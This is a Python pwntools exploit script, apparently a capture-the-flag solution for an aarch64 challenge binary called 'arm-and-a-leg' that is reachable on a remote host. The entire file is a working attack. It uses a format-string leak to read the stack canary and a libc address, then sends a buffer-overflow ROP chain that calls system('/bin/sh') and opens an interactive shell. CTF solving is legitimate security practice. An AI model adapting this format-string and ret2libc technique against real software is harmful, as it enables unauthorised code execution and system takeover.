from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("arm-and-a-leg.gold.b01le.rs", 1337)
    if args.GDB:
        return gdb.debug("qemu-arm -g 1234 ./chal_patched", gdbscript=gdbscript, *a, **kw)
    else:
        return process("qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g", "1234", "chal", *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ru("2. Legs")
sl('1')
ru('What number am I thinking of?')
sl('1337')
ru('appendage?')
# sl('%15$p')
# ru("Thanks, we will ship to:")

stderr      = 0x0411fc0
stdin  = 0x0412030
scanfgot    = 0x0412038
printfgot   = 0x0412038

d = '>>%15$p>>%17$p'
sl(d)
ru(">>")

canary = int(ru(">>")[:-2:].decode(), 16)
ic(hex(canary))

libc = int(rl().decode(), 16) - 0x303fc
ic(hex(libc))

ru("Care to leave some feedback?!")

libc  += 0x9000
system = libc + 0x046dc4
binsh  = libc + 0x14cd10
gadg   = libc + 0x8fe10

# # LOCAL
# system = libc + 0x046d94
# binsh  = libc + 0x15d9f8 
# gadg   = libc + 0x08fc60
# gadg   = libc + 0x9bc70

# 0x000000000008fe10 :  mov x0, x20; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; 

payload = (0x68*b"a" + p64(canary) + p64(0xd00000d) + p64(gadg) + p64(0x0) + p64(canary) + 
                    p64(0x0) + p64(gadg) + p64(0x0) + p64(binsh) +
                    p64(0x0) + p64(system) + p64(0x0) + p64(binsh))

sl(payload)

i()
